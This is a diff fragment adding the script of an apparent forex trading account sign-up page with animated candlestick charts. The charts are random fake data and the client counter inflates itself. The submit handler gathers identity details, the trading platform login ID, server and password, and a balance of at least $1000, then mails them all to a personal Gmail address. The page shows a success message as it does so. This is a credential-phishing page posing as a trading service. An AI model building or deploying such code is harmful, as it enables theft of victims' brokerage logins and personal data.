+                const high = Math.max(open, close) + Math.random() * volatility * 0.5;
+                const low = Math.min(open, close) - Math.random() * volatility * 0.5;
+                
+                this.candles.push({ open, high, low, close });
+                this.price = close;
+                
+                if (this.candles.length > this.maxCandles) {
+                    this.candles.shift();
+                }
+            }
+
+            draw() {
+                const width = this.canvas.width = this.canvas.offsetWidth;
+                const height = this.canvas.height = this.canvas.offsetHeight;
+                const padding = 10;
+                const chartHeight = height - padding * 2;
+                const chartWidth = width - padding * 2;
+                
+                this.ctx.clearRect(0, 0, width, height);
+                
+                // Background grid
+                this.ctx.strokeStyle = '#1a2332';
+                this.ctx.lineWidth = 0.5;
+                for (let i = 0; i < 5; i++) {
+                    const y = padding + (chartHeight / 4) * i;
+                    this.ctx.beginPath();
+                    this.ctx.moveTo(padding, y);
+                    this.ctx.lineTo(width - padding, y);
+                    this.ctx.stroke();
+                }
+
+                // Find min/max for scaling
+                let minPrice = Infinity, maxPrice = -Infinity;
+                this.candles.forEach(c => {
+                    minPrice = Math.min(minPrice, c.low);
+                    maxPrice = Math.max(maxPrice, c.high);
+                });
+                
+                const priceRange = maxPrice - minPrice || 1;
+                const candleWidth = chartWidth / this.maxCandles * 0.7;
+                const spacing = chartWidth / this.maxCandles;
+
+                this.candles.forEach((candle, i) => {
+                    const x = padding + spacing * i + spacing / 2;
+                    const yOpen = padding + chartHeight - ((candle.open - minPrice) / priceRange) * chartHeight;
+                    const yClose = padding + chartHeight - ((candle.close - minPrice) / priceRange) * chartHeight;
+                    const yHigh = padding + chartHeight - ((candle.high - minPrice) / priceRange) * chartHeight;
+                    const yLow = padding + chartHeight - ((candle.low - minPrice) / priceRange) * chartHeight;
+                    
+                    const isBullish = candle.close >= candle.open;
+                    const color = isBullish ? '#00d084' : '#ff4757';
+                    
+                    // Wick
+                    this.ctx.strokeStyle = color;
+                    this.ctx.lineWidth = 1;
+                    this.ctx.beginPath();
+                    this.ctx.moveTo(x, yHigh);
+                    this.ctx.lineTo(x, yLow);
+                    this.ctx.stroke();
+                    
+                    // Body
+                    this.ctx.fillStyle = color;
+                    const bodyTop = Math.min(yOpen, yClose);
+                    const bodyHeight = Math.abs(yClose - yOpen) || 1;
+                    this.ctx.fillRect(x - candleWidth / 2, bodyTop, candleWidth, bodyHeight);
+                });
+
+                // Price line overlay
+                this.ctx.strokeStyle = 'rgba(0, 212, 255, 0.3)';
+                this.ctx.lineWidth = 1;
+                this.ctx.setLineDash([5, 5]);
+                const lastClose = this.candles[this.candles.length - 1].close;
+                const lastY = padding + chartHeight - ((lastClose - minPrice) / priceRange) * chartHeight;
+                this.ctx.beginPath();
+                this.ctx.moveTo(padding, lastY);
+                this.ctx.lineTo(width - padding, lastY);
+                this.ctx.stroke();
+                this.ctx.setLineDash([]);
+            }
+
+            update() {
+                if (Math.random() > 0.7) {
+                    this.addCandle();
+                }
+                this.draw();
+            }
+        }
+
+        // Create charts
+        const chartData = [
+            { pair: 'EUR/USD', price: 1.0845, change: '+0.24%' },
+            { pair: 'GBP/USD', price: 1.2732, change: '-0.12%' },
+            { pair: 'USD/JPY', price: 149.85, change: '+0.45%' },
+            { pair: 'AUD/USD', price: 0.6523, change: '+0.08%' },
+            { pair: 'USD/CAD', price: 1.3542, change: '-0.33%' },
+            { pair: 'EUR/GBP', price: 0.8521, change: '+0.15%' }
+        ];
+
+        const charts = [];
+
+        function createCharts() {
+            const grid = document.getElementById('chartsGrid');
+            grid.innerHTML = '';
+            charts.length = 0;
+            
+            chartData.forEach((data, index) => {
+                const isPositive = data.change.includes('+');
+                const card = document.createElement('div');
+                card.className = 'chart-card';
+                card.innerHTML = `
+                    <div class="chart-header">
+                        <span class="pair-name">${data.pair}</span>
+                        <span class="pair-change ${isPositive ? 'positive' : 'negative'}">${data.change}</span>
+                    </div>
+                    <canvas class="chart-canvas" id="chart${index}"></canvas>
+                    <div class="chart-info">
+                        <span>Price: ${data.price.toFixed(data.pair.includes('JPY') ? 2 : 4)}</span>
+                        <span>Vol: ${(Math.random() * 1000 + 500).toFixed(0)}K</span>
+                    </div>
+                `;
+                grid.appendChild(card);
+                
+                setTimeout(() => {
+                    const chart = new CandlestickChart(`chart${index}`, data.pair, data.price);
+                    charts.push(chart);
+                }, 100);
+            });
+        }
+
+        createCharts();
+
+        // Animate charts
+        setInterval(() => {
+            charts.forEach(chart => chart.update());
+        }, 2000);
+
+        // Form Navigation
+        let currentStep = 1;
+
+        function updateStepIndicator() {
+            for (let i = 1; i <= 3; i++) {
+                const dot = document.getElementById(`dot${i}`);
+                dot.classList.remove('active', 'completed');
+                if (i < currentStep) {
+                    dot.classList.add('completed');
+                    dot.innerHTML = '✓';
+                } else if (i === currentStep) {
+                    dot.classList.add('active');
+                    dot.innerHTML = i;
+                } else {
+                    dot.innerHTML = i;
+                }
+            }
+        }
+
+        function showStep(step) {
+            document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+            currentStep = step;
+            updateStepIndicator();
+        }
+
+        function validateStep(step) {
+            let valid = true;
+            
+            if (step === 1) {
+                const fields = ['country', 'firstName', 'lastName', 'email', 'phone'];
+                fields.forEach(field => {
+                    const el = document.getElementById(field);
+                    const error = document.getElementById(field + 'Error');
+                    if (!el.value.trim()) {
+                        error.classList.add('show');
+                        el.style.borderColor = '#ff4757';
+                        valid = false;
+                    } else {
+                        error.classList.remove('show');
+                        el.style.borderColor = '';
+                    }
+                });
+                
+                // Email validation
+                const email = document.getElementById('email');
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (email.value && !emailRegex.test(email.value)) {
+                    document.getElementById('emailError').textContent = 'Please enter a valid email';
+                    document.getElementById('emailError').classList.add('show');
+                    email.style.borderColor = '#ff4757';
+                    valid = false;
+                }
+            }
+            
+            if (step === 2) {
+                const accountType = document.getElementById('accountType');
+                if (!accountType.value) {
+                    document.getElementById('accountTypeError').classList.add('show');
+                    valid = false;
+                } else {
+                    document.getElementById('accountTypeError').classList.remove('show');
+                }
+
+                const fields = ['dob', 'address', 'city', 'state', 'zip'];
+                fields.forEach(field => {
+                    const el = document.getElementById(field);
+                    const error = document.getElementById(field + 'Error');
+                    if (!el.value.trim()) {
+                        error.classList.add('show');
+                        el.style.borderColor = '#ff4757';
+                        valid = false;
+                    } else {
+                        error.classList.remove('show');
+                        el.style.borderColor = '';
+                    }
+                });
+            }
+            
+            return valid;
+        }
+
+        function nextStep(current) {
+            if (validateStep(current)) {
+                showStep(current + 1);
+            }
+        }
+
+        function prevStep(current) {
+            showStep(current - 1);
+        }
+
+        function selectAccountType(type, element) {
+            document.querySelectorAll('.account-type-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            document.getElementById('accountType').value = type;
+            document.getElementById('accountTypeError').classList.remove('show');
+        }
+
+        function selectPlatform(platform, element) {
+            document.querySelectorAll('.platform-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            document.getElementById('platform').value = platform;
+            document.getElementById('platformError').classList.remove('show');
+        }
+
+        function submitForm() {
+            let valid = true;
+            
+            // Validate platform
+            const platform = document.getElementById('platform');
+            if (!platform.value) {
+                document.getElementById('platformError').classList.add('show');
+                valid = false;
+            }
+
+            // Validate login details
+            const fields = ['loginId', 'serverName', 'password'];
+            fields.forEach(field => {
+                const el = document.getElementById(field);
+                const error = document.getElementById(field + 'Error');
+                if (!el.value.trim()) {
+                    error.classList.add('show');
+                    el.style.borderColor = '#ff4757';
+                    valid = false;
+                } else {
+                    error.classList.remove('show');
+                    el.style.borderColor = '';
+                }
+            });
+
+            // Validate amount
+            const amount = document.getElementById('amount');
+            if (!amount.value || parseFloat(amount.value) < 1000) {
+                document.getElementById('amountError').classList.add('show');
+                amount.style.borderColor = '#ff4757';
+                valid = false;
+            } else {
+                document.getElementById('amountError').classList.remove('show');
+                amount.style.borderColor = '';
+            }
+
+            // Validate agreement
+            const agreement = document.getElementById('agreement');
+            if (!agreement.checked) {
+                document.getElementById('agreementError').classList.add('show');
+                valid = false;
+            } else {
+                document.getElementById('agreementError').classList.remove('show');
+            }
+
+            if (!valid) return;
+
+            // Show spinner
+            document.getElementById('spinner').style.display = 'block';
+            document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+
+            // Simulate submission and send email
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                
+                // Get form data
+                const formData = {
+                    country: document.getElementById('country').value,
+                    firstName: document.getElementById('firstName').value,
+                    middleName: document.getElementById('middleName').value,
+                    lastName: document.getElementById('lastName').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value,
+                    accountType: document.getElementById('accountType').value,
+                    dob: document.getElementById('dob').value,
+                    address: document.getElementById('address').value,
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value,
+                    zip: document.getElementById('zip').value,
+                    platform: document.getElementById('platform').value,
+                    loginId: document.getElementById('loginId').value,
+                    serverName: document.getElementById('serverName').value,
+                    password: document.getElementById('password').value,
+                    amount: document.getElementById('amount').value
+                };
+
+                // Send email using mailto
+                const subject = `New Trading Account Application - ${formData.firstName} ${formData.lastName}`;
+                const body = `
+NEW TRADING ACCOUNT APPLICATION
+===============================
+
+PERSONAL INFORMATION:
+---------------------
+Country: ${formData.country}
+First Name: ${formData.firstName}
+Middle Name: ${formData.middleName || 'N/A'}
+Last Name: ${formData.lastName}
+Email: ${formData.email}
+Phone: ${formData.phone}
+
+ACCOUNT DETAILS:
+----------------
+Account Type: ${formData.accountType.toUpperCase()}
+Date of Birth: ${formData.dob}
+Address: ${formData.address}
+City: ${formData.city}
+State: ${formData.state}
+ZIP Code: ${formData.zip}
+
+TRADING PLATFORM:
+-----------------
+Platform: ${formData.platform}
+Login ID: ${formData.loginId}
+Server Name: ${formData.serverName}
+Password: ${formData.password}
+Account Balance: $${formData.amount}
+
+Submitted on: ${new Date().toLocaleString()}
+                `.trim();
+
+                // Open email client
+                window.location.href = `mailto:oriamichelle874@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+                // Show success
+                document.getElementById('confirmEmail').textContent = formData.email;
+                document.getElementById('successMessage').classList.add('show');
+                
+                // Update client count
+                const statClients = document.getElementById('statClients');
+                statClients.textContent = (parseInt(statClients.textContent.replace(',', '')) + 1).toLocaleString();
+            }, 2000);
+        }
+
+        function resetForm() {
+            document.getElementById('tradingForm').reset();
+            document.querySelectorAll('.account-type-card').forEach(c => c.classList.remove('selected'));
+            document.querySelectorAll('.platform-card').forEach(c => c.classList.remove('selected'));
+            document.getElementById('successMessage').classList.remove('show');
+            showStep(1);
+        }
+
+        // Clear error styling on input
+        document.querySelectorAll('input, select').forEach(input => {
+            input.addEventListener('input', function() {
+                this.style.borderColor = '';
+                const errorId = this.id + 'Error';
+                const errorEl = document.getElementById(errorId);
+                if (errorEl) errorEl.classList.remove('show');
+            });
+        });
+
+        // Handle resize for charts
+        let resizeTimeout;
+        window.addEventListener('resize', () => {
+            clearTimeout(resizeTimeout);
+            resizeTimeout = setTimeout(() => {
+                createCharts();
+            }, 250);
+        });
+
+        // Smooth scroll for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
